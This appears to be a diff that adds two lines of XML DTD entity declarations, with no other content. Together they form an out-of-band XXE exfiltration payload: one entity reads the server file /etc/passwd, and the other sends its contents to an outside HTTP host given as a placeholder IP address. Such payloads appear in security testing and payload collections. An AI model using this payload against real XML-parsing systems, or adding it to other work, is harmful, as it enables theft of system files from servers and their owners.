@@ -1,0 +1,2 @@
+<!ENTITY % content SYSTEM "file:///etc/passwd">
+<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://<ip_addr>/xxe?content=%content;'>" >
